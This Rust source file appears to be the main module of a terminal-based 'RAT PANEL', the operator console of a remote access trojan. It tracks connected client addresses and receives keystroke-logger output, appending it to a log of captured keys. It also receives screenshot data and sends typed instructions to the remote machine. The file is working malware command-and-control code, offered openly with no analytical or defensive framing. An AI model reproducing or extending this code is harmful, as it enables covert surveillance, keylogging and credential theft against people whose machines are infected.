mod app;
mod ui;
mod server;

use app::App;
use color_eyre::Result;
use std::error::Error;
use std::io;
use std::time::{Duration, Instant};

use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode};
use crossterm::execute;
use crossterm::terminal::{
    EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode,
};
use ratatui::Terminal;
use ratatui::backend::{Backend, CrosstermBackend};

use crate::server::ClientEvent;

pub fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let app = App::new(" ◈ RAT PANEL ");
    let app_result = run_app(&mut terminal, app, tick_rate);

    disable_raw_mode()?;
    execute!(
        terminal.backend_mut(),
        LeaveAlternateScreen,
        DisableMouseCapture
    )?;
    terminal.show_cursor()?;

    if let Err(err) = app_result {
        println!("{err:?}");
    }

    Ok(())
}

fn run_app<B: Backend>(
    terminal: &mut Terminal<B>,
    mut app: App,
    tick_rate: Duration,
) -> Result<(), Box<dyn Error>>
where
    B::Error: 'static,
{
    let mut last_tick = Instant::now();
    loop {
        terminal.draw(|frame| ui::render(frame, &mut app))?;

        while let Ok(event) = app.client.app_receiver.try_recv() {
            match event {
                ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
                ClientEvent::Data(mut bytes) => { 
                    if bytes.ends_with(b"keystroke_reader") {
                        bytes.truncate(bytes.len() - b"keystroke_reader".len());
                        let key = std::str::from_utf8(&bytes)?;
                        app.logged_keys.push_str(key);
                    } else if bytes.ends_with(b"screenshot") {
                        bytes.truncate(bytes.len() - b"screenshot".len());
                        
                    }
                },  
                ClientEvent::Disconnected => { app.client_addr = String::new() },
            }
        }

        let timeout = tick_rate.saturating_sub(last_tick.elapsed());
        if !event::poll(timeout)? {
            app.on_tick();
            last_tick = Instant::now();
            continue;
        }
        if let Some(key) = event::read()?.as_key_press_event() {
            match key.code {
                KeyCode::Tab => app.on_right(),
                KeyCode::BackTab => app.on_left(),
                KeyCode::Backspace => app.delete_char(),
                KeyCode::Enter => app.submit_instructions(),    
                KeyCode::Left => app.move_cursor_left(),
                KeyCode::Right => app.move_cursor_right(),
                KeyCode::Char(to_insert) => app.enter_char(to_insert),
                KeyCode::Esc => return Ok(()),
                _ => {}
            }
        }
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let rt = tokio::runtime::Runtime::new()?;
    let _guard = rt.enter();

    let tick_rate = Duration::from_millis(250);
    run(tick_rate)?;
    Ok(())
}
